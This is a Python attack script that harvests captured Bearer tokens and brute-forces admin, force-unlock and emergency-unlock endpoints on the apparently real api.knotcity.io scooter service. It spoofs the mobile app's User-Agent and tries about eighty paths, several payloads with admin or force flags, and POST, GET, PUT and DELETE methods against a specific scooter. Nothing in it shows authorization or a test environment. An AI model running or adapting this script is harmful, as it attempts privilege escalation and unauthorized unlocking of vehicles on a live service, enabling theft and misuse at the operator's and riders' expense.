#!/usr/bin/env python3
"""
Admin Endpoint Discovery
Tests ALL possible admin endpoints until we find one that works
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Test Scooter (using TUF061 since we know the token works for it)
TEST_SCOOTER = {
    "serial": "TUF061",
    "lat": 48.8566,
    "lng": 2.3522
}

def extract_latest_token():
    """Extract the latest token from capture files"""
    print("[SEARCH] Extracting latest token...")
    
    # Try LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found token in LATEST_TOKEN.txt: {token[:50]}...")
            return token
    except:
        pass
    
    # Fallback to capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                token = tokens[-1]  # Get the most recent
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
        except:
            continue
    
    print("[ERROR] No Bearer tokens found")
    return None

def test_admin_endpoint(token, endpoint, payload, method="POST"):
    """Test a specific admin endpoint"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    try:
        if method == "POST":
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json=payload,
                timeout=15
            )
        elif method == "GET":
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                params=payload,
                timeout=15
            )
        elif method == "PUT":
            response = requests.put(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json=payload,
                timeout=15
            )
        elif method == "DELETE":
            response = requests.delete(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json=payload,
                timeout=15
            )
        
        return response.status_code, response.text, response.headers
        
    except Exception as e:
        return None, str(e), {}

def main():
    print("=" * 80)
    print("[ADMIN DISCOVERY] COMPREHENSIVE ADMIN ENDPOINT DISCOVERY")
    print("=" * 80)
    print("[WARNING] Testing ALL possible admin endpoints until we find one that works!")
    print("=" * 80)
    
    # Extract token
    token = extract_latest_token()
    if not token:
        print("[ERROR] No token found. Please capture a fresh token first.")
        return
    
    print(f"[TARGET] Scooter: {TEST_SCOOTER['serial']}")
    print(f"[TOKEN] {token[:50]}...")
    print("=" * 80)
    
    # Comprehensive list of admin endpoints to test
    admin_endpoints = [
        # Direct admin unlock endpoints
        "/api/application/vehicles/unlock/admin",
        "/api/admin/vehicles/unlock",
        "/api/application/admin/vehicles/unlock",
        "/api/vehicles/admin/unlock",
        "/api/admin/unlock",
        "/api/application/vehicles/admin/unlock",
        "/api/admin/application/vehicles/unlock",
        "/api/vehicles/unlock/admin",
        "/api/unlock/admin",
        "/api/admin/vehicles/unlock/force",
        "/api/application/vehicles/unlock/force",
        "/api/vehicles/unlock/force",
        
        # Admin management endpoints
        "/api/admin/vehicles",
        "/api/admin/vehicles/manage",
        "/api/admin/vehicles/control",
        "/api/admin/vehicles/operate",
        "/api/application/admin/vehicles",
        "/api/application/admin/vehicles/manage",
        "/api/application/admin/vehicles/control",
        "/api/application/admin/vehicles/operate",
        
        # Force unlock endpoints
        "/api/application/vehicles/force-unlock",
        "/api/admin/vehicles/force-unlock",
        "/api/vehicles/force-unlock",
        "/api/application/vehicles/force_unlock",
        "/api/admin/vehicles/force_unlock",
        "/api/vehicles/force_unlock",
        
        # Emergency endpoints
        "/api/emergency/unlock",
        "/api/admin/emergency/unlock",
        "/api/application/emergency/unlock",
        "/api/vehicles/emergency/unlock",
        
        # System endpoints
        "/api/system/unlock",
        "/api/admin/system/unlock",
        "/api/application/system/unlock",
        "/api/vehicles/system/unlock",
        
        # Root admin endpoints
        "/api/root/unlock",
        "/api/admin/root/unlock",
        "/api/application/root/unlock",
        "/api/vehicles/root/unlock",
        
        # Super admin endpoints
        "/api/super/unlock",
        "/api/admin/super/unlock",
        "/api/application/super/unlock",
        "/api/vehicles/super/unlock",
        
        # Master endpoints
        "/api/master/unlock",
        "/api/admin/master/unlock",
        "/api/application/master/unlock",
        "/api/vehicles/master/unlock",
        
        # Query parameter variations
        "/api/application/vehicles/unlock?admin=true",
        "/api/application/vehicles/unlock?force=true",
        "/api/application/vehicles/unlock?scope=admin",
        "/api/application/vehicles/unlock?role=admin",
        "/api/application/vehicles/unlock?permission=admin",
        "/api/application/vehicles/unlock?level=admin",
        "/api/application/vehicles/unlock?type=admin",
        "/api/application/vehicles/unlock?mode=admin",
        "/api/application/vehicles/unlock?access=admin",
        "/api/application/vehicles/unlock?privilege=admin",
        
        # Alternative paths
        "/api/v1/admin/vehicles/unlock",
        "/api/v2/admin/vehicles/unlock",
        "/api/v1/application/admin/vehicles/unlock",
        "/api/v2/application/admin/vehicles/unlock",
        "/api/v1/vehicles/admin/unlock",
        "/api/v2/vehicles/admin/unlock",
        
        # Legacy endpoints
        "/api/legacy/admin/unlock",
        "/api/old/admin/unlock",
        "/api/backup/admin/unlock",
        "/api/test/admin/unlock",
        "/api/dev/admin/unlock",
        "/api/staging/admin/unlock",
        
        # Internal endpoints
        "/api/internal/admin/unlock",
        "/api/private/admin/unlock",
        "/api/secure/admin/unlock",
        "/api/protected/admin/unlock",
        
        # Direct vehicle control
        "/api/vehicles/TUF061/unlock",
        "/api/admin/vehicles/TUF061/unlock",
        "/api/application/vehicles/TUF061/unlock",
        "/api/vehicles/TUF061/admin/unlock",
        "/api/vehicles/TUF061/force/unlock",
        "/api/vehicles/TUF061/emergency/unlock",
    ]
    
    # Payload variations
    payload_variations = [
        # Standard admin payload
        {
            "serial_number": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng'],
            "force": True
        },
        # Without force
        {
            "serial_number": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng']
        },
        # With admin flag
        {
            "serial_number": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng'],
            "admin": True
        },
        # With scope
        {
            "serial_number": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng'],
            "scope": "admin"
        },
        # With role
        {
            "serial_number": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng'],
            "role": "admin"
        },
        # Alternative field names
        {
            "serialNumber": TEST_SCOOTER['serial'],
            "latitude": TEST_SCOOTER['lat'],
            "longitude": TEST_SCOOTER['lng'],
            "force": True
        },
        {
            "vehicle_id": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng'],
            "force": True
        },
        {
            "id": TEST_SCOOTER['serial'],
            "lat": TEST_SCOOTER['lat'],
            "lng": TEST_SCOOTER['lng'],
            "force": True
        }
    ]
    
    # HTTP methods to test
    methods = ["POST", "GET", "PUT", "DELETE"]
    
    successful_endpoints = []
    total_tests = len(admin_endpoints) * len(payload_variations) * len(methods)
    current_test = 0
    
    print(f"[INFO] Testing {total_tests} combinations...")
    print("=" * 80)
    
    for endpoint in admin_endpoints:
        for payload in payload_variations:
            for method in methods:
                current_test += 1
                
                print(f"\n[TEST {current_test}/{total_tests}] {method} {endpoint}")
                print(f"   Payload: {json.dumps(payload, indent=2)}")
                
                status_code, response_text, headers = test_admin_endpoint(token, endpoint, payload, method)
                
                if status_code is None:
                    print(f"   [ERROR] Request failed: {response_text}")
                    continue
                
                print(f"   Status: {status_code}")
                print(f"   Response: {response_text[:200]}{'...' if len(response_text) > 200 else ''}")
                
                # Check for success
                if status_code == 200:
                    print(f"   [SUCCESS] ADMIN ENDPOINT FOUND!")
                    print(f"   [CRITICAL] VULNERABILITY CONFIRMED!")
                    successful_endpoints.append({
                        'endpoint': endpoint,
                        'method': method,
                        'payload': payload,
                        'status': status_code,
                        'response': response_text
                    })
                elif status_code == 201:
                    print(f"   [SUCCESS] ADMIN ENDPOINT FOUND (Created)!")
                    print(f"   [CRITICAL] VULNERABILITY CONFIRMED!")
                    successful_endpoints.append({
                        'endpoint': endpoint,
                        'method': method,
                        'payload': payload,
                        'status': status_code,
                        'response': response_text
                    })
                elif status_code == 401:
                    print(f"   [ERROR] Token expired/invalid")
                elif status_code == 403:
                    print(f"   [ERROR] Permission denied")
                elif status_code == 404:
                    print(f"   [INFO] Endpoint not found")
                elif status_code == 400:
                    print(f"   [INFO] Bad request - endpoint exists but wrong payload")
                else:
                    print(f"   [INFO] Status {status_code}")
    
    # Results
    print("\n" + "=" * 80)
    print("[RESULTS] ADMIN ENDPOINT DISCOVERY RESULTS")
    print("=" * 80)
    
    if successful_endpoints:
        print(f"[CRITICAL] FOUND {len(successful_endpoints)} WORKING ADMIN ENDPOINTS!")
        print("[CRITICAL] ADMIN PRIVILEGE ESCALATION VULNERABILITY CONFIRMED!")
        
        for i, endpoint_info in enumerate(successful_endpoints, 1):
            print(f"\n[SUCCESS {i}] Working Admin Endpoint:")
            print(f"   Method: {endpoint_info['method']}")
            print(f"   Endpoint: {endpoint_info['endpoint']}")
            print(f"   Payload: {json.dumps(endpoint_info['payload'], indent=2)}")
            print(f"   Status: {endpoint_info['status']}")
            print(f"   Response: {endpoint_info['response'][:200]}{'...' if len(endpoint_info['response']) > 200 else ''}")
    else:
        print("[OK] No working admin endpoints found")
        print("[OK] Admin privilege escalation protection appears to be working")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
